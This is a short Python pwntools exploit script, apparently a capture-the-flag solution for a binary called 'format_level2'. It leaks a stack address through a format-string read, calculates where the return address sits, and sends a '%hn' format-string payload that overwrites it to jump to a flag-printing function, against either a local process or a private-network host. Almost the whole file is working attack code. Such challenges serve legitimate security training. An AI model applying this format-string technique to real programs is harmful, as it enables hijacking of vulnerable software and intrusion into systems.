from pwn import * 
from pwn import p32


context(arch='i386',os = 'linux', log_level='DEBUG')
debug = 1
gdb_is = 1
# context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./format_level2")
    
else:
    host = "192.168.0.111:50695"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    # r = gdb.debug("./format_level2",'b talk')
    gdb.attach(r,'b talk')
    # gdb.attach(r)
    pause()
    pass


# ----------------------手动测
r.sendlineafter(b'choice: \n',b'3')
r.sendafter(b'talk: \n',b'%1$x')
r.recvuntil(b'said: \n')
num = int(r.recvuntil(b'But')[:-3].decode(),16)
# 0xffcf8dbc ret
# 0xffcf8d9c str in stack
# distance -0x20
flag_addr = 0x8049317
ret_addr_ptr = 0x804974a
ret_addr = num + 0x20
info(hex(ret_addr))
# payload = fmtstr_payload(7,{ret_addr:flag_addr},write_size='short')
# info(payload)
# 0x0804974a
# 0x1704974a

payload = p32(ret_addr) + b'%37651c%7$hn'
info(size(payload))
r.sendlineafter(b'choice: \n',b'3')
r.sendafter(b'talk: \n',payload)
r.interactive()

